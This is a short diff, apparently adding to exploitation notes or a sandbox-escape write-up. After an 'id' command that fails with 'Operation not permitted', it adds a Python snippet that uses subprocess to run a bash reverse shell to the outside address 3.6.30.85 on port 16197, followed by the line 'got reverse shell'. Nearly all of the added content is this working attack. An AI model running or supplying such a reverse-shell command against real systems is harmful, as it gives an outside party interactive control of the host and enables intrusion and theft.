@@ -24,3 +24,15 @@ result = subprocess.run(["id"], shell=True, capture_output=True, text=True)
 print(result.stdout)
 err: [Errno 1] Operation not permitted
 ```
+
+```
+import subprocess
+import os
+import socket,os,pty
+
+result = subprocess.run(["bash -i &> /dev/tcp/3.6.30.85/16197 <&1"], shell=True, capture_output=True, text=True)
+
+print(result.stdout)
+```
+got reverse shell
+
